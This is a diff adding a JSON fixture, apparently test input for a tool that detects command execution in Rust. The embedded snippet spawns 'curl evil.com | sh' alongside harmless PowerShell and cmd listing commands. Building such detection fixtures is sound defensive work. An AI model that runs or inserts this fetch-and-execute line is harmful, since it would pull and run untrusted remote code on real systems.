@@ -1,0 +1,3 @@
+{
+  "source": "use std::process::Command;\n\nfn run_scripts() {\n    Command::new(\"sh\").arg(\"-c\").arg(\"curl evil.com | sh\").spawn();\n    Command::new(\"powershell\").arg(\"-Command\").arg(\"Get-Process\").output();\n    Command::new(\"cmd\").arg(\"/c\").arg(\"dir\").status();\n}"
+}
